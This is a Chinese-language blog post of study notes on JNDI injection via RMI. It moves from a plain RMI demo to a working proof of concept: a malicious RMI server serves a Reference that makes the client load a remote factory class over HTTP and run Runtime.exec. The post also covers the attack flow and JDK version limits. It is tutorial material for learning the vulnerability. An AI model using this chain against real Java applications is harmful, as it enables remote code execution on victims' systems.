@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="基本概念JAVA RMIjava rmi为java中的一个远程方法调用的实现 java rmi demoRmiRegistry123456789101112import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Rmi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jndi注入学习笔记(rmi向量)">
+<meta property="og:url" content="https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="基本概念JAVA RMIjava rmi为java中的一个远程方法调用的实现 java rmi demoRmiRegistry123456789101112import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Rmi">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-05-11T15:17:26.978Z">
+<meta property="article:modified_time" content="2020-05-12T14:37:58.651Z">
+<meta property="article:author" content="tian">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>jndi注入学习笔记(rmi向量)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/05/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonscollections1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&text=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&is_video=false&description=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=jndi注入学习笔记(rmi向量)&body=Check out this article: https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&name=jndi注入学习笔记(rmi向量)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&t=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本概念"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JAVA-RMI"><span class="toc-number">1.1.</span> <span class="toc-text">JAVA RMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java-rmi-demo"><span class="toc-number">1.2.</span> <span class="toc-text">java rmi demo</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RmiRegistry"><span class="toc-number">1.2.1.</span> <span class="toc-text">RmiRegistry</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IHello-amp-IHelloImpl-远程对象接口和其实现类"><span class="toc-number">1.2.2.</span> <span class="toc-text">IHello &amp; IHelloImpl (远程对象接口和其实现类)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RmiServer"><span class="toc-number">1.2.3.</span> <span class="toc-text">RmiServer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RmiClient"><span class="toc-number">1.2.4.</span> <span class="toc-text">RmiClient</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI"><span class="toc-number">1.3.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#JNDI介绍"><span class="toc-number">1.3.1.</span> <span class="toc-text">JNDI介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#用JNDI来访问RMI服务"><span class="toc-number">1.3.2.</span> <span class="toc-text">用JNDI来访问RMI服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JNDI-Reference-RMI攻击向量"><span class="toc-number">1.3.3.</span> <span class="toc-text">JNDI Reference + RMI攻击向量</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#References"><span class="toc-number">1.4.</span> <span class="toc-text">References:</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        jndi注入学习笔记(rmi向量)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Hexo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-11T15:17:26.978Z" itemprop="datePublished">2020-05-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="JAVA-RMI"><a href="#JAVA-RMI" class="headerlink" title="JAVA RMI"></a>JAVA RMI</h4><p>java rmi为java中的一个远程方法调用的实现</p>
+<h4 id="java-rmi-demo"><a href="#java-rmi-demo" class="headerlink" title="java rmi demo"></a>java rmi demo</h4><h5 id="RmiRegistry"><a href="#RmiRegistry" class="headerlink" title="RmiRegistry"></a>RmiRegistry</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiRegistry</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="IHello-amp-IHelloImpl-远程对象接口和其实现类"><a href="#IHello-amp-IHelloImpl-远程对象接口和其实现类" class="headerlink" title="IHello &amp; IHelloImpl (远程对象接口和其实现类)"></a>IHello &amp; IHelloImpl (远程对象接口和其实现类)</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IHelloImpl</span>  <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IHelloImpl</span><span class="params">()</span><span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="keyword">this</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="RmiServer"><a href="#RmiServer" class="headerlink" title="RmiServer"></a>RmiServer</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"192.168.0.106"</span>,<span class="number">1099</span>);</span><br><span class="line">        IHello iHelloIml = <span class="keyword">new</span> IHelloImpl();</span><br><span class="line">        registry.bind(<span class="string">"hello"</span>,iHelloIml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="RmiClient"><a href="#RmiClient" class="headerlink" title="RmiClient"></a>RmiClient</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"192.168.0.106"</span>,<span class="number">1099</span>);</span><br><span class="line">        IHello iHello = (IHello)registry.lookup(<span class="string">"hello"</span>);</span><br><span class="line">        String response = iHello.sayHello();</span><br><span class="line">        System.out.printf(response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>RmiRegistry创建了rmi服务注册中心，RmiServer可向RmiRegistry注册远程对象信息，然后RmiClent向注册中心</p>
+<p>通过参数查找到了在RmiServer的对象，然后与RmiServer通信，RmiServer执行了RmiClient想要执行的sayHello方法后，再将结果通过网络传输给RmiClient</p>
+<h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><h5 id="JNDI介绍"><a href="#JNDI介绍" class="headerlink" title="JNDI介绍"></a>JNDI介绍</h5><p>JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</p>
+<h5 id="用JNDI来访问RMI服务"><a href="#用JNDI来访问RMI服务" class="headerlink" title="用JNDI来访问RMI服务"></a>用JNDI来访问RMI服务</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException , RemoteException </span>&#123;</span><br><span class="line">        Hashtable env =<span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">"rmi://192.168.0.106:1099"</span>);</span><br><span class="line">        Context ctx =<span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        IHello hello = (IHello) ctx.lookup(<span class="string">"rmi://192.168.0.106/hello"</span>);</span><br><span class="line">        String string = hello.sayHello();</span><br><span class="line">        System.out.println(string);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="JNDI-Reference-RMI攻击向量"><a href="#JNDI-Reference-RMI攻击向量" class="headerlink" title="JNDI Reference + RMI攻击向量"></a>JNDI Reference + RMI攻击向量</h5><p>恶意RMI服务器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException,NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Calc"</span>,<span class="string">"CalcFactory"</span>,<span class="string">"http://192.168.0.106/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"calc"</span>,referenceWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当RMI客户端通过lookup方法去查找calc这个对象的时候，得到的是一个Reference类的存根,客户端会现在本地类路径去查找Calc这个类，如果没有就去加载<a href="http://192.168.0.106/CalcFactory.class这个工厂类，再调用工厂类的getObjectInstance()方法。可以通过重写getObjectInstance()方法把恶意代码包含进去。" target="_blank" rel="noopener">http://192.168.0.106/CalcFactory.class这个工厂类，再调用工厂类的getObjectInstance()方法。可以通过重写getObjectInstance()方法把恶意代码包含进去。</a></p>
+<p>CalcFactory.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CalcFactory</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>被攻击的RMI客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        context.lookup(<span class="string">"rmi://192.168.0.106:1099/calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击流程：</p>
+<p>1.客户端lookup参数可控，攻击者将参数指定为设置好的恶意rmi服务器地址</p>
+<p>2.客户端就去查找calc这个对象，恶意服务器返回一个Reference类的存根，客户端在本地查找不到Calc类,就去远程加载CalcFactory类调用getObjectInstance()方法执行了恶意代码。</p>
+<p>局限：</p>
+<p>JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。</p>
+<h4 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h4><p><a href="https://paper.seebug.org/1091/#jndi-referencermi" target="_blank" rel="noopener">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>
+<p><a href="https://www.kingkk.com/2020/04/%E6%B5%85%E8%B0%88JNDI/" target="_blank" rel="noopener">浅谈JNDI</a></p>
+<p><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本概念"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JAVA-RMI"><span class="toc-number">1.1.</span> <span class="toc-text">JAVA RMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java-rmi-demo"><span class="toc-number">1.2.</span> <span class="toc-text">java rmi demo</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RmiRegistry"><span class="toc-number">1.2.1.</span> <span class="toc-text">RmiRegistry</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IHello-amp-IHelloImpl-远程对象接口和其实现类"><span class="toc-number">1.2.2.</span> <span class="toc-text">IHello &amp; IHelloImpl (远程对象接口和其实现类)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RmiServer"><span class="toc-number">1.2.3.</span> <span class="toc-text">RmiServer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RmiClient"><span class="toc-number">1.2.4.</span> <span class="toc-text">RmiClient</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI"><span class="toc-number">1.3.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#JNDI介绍"><span class="toc-number">1.3.1.</span> <span class="toc-text">JNDI介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#用JNDI来访问RMI服务"><span class="toc-number">1.3.2.</span> <span class="toc-text">用JNDI来访问RMI服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JNDI-Reference-RMI攻击向量"><span class="toc-number">1.3.3.</span> <span class="toc-text">JNDI Reference + RMI攻击向量</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#References"><span class="toc-number">1.4.</span> <span class="toc-text">References:</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&text=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&title=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/&is_video=false&description=jndi注入学习笔记(rmi向量)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=jndi注入学习笔记(rmi向量)&body=Check out this article: https://tian2000.github.io/2020/05/11/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(rmi%E5%90%91%E9%87%8F)/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
